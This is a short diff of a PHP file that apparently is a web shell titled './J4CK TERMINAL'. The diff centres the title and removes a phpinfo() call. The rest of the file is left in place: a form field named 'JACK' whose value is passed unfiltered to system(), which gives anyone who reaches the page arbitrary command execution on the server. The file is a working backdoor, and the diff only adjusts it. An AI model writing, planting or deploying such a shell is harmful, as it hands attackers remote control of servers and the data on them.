@@ -1,5 +1,5 @@
 <?php
-echo "./J4CK TERMINAL";
+echo "<center>./J4CK TERMINAL</center>";
         echo "<pre>";
         echo "<form name='form' action='#' method='post'>
         <input type='text' name='JACK'/> <input type='submit' value='enter'/>
@@ -7,6 +7,5 @@ echo "./J4CK TERMINAL";
         $cmd = ($_POST['JACK']);
         system($cmd);
         echo "</pre>";
-        phpinfo();
         die;
 ?>
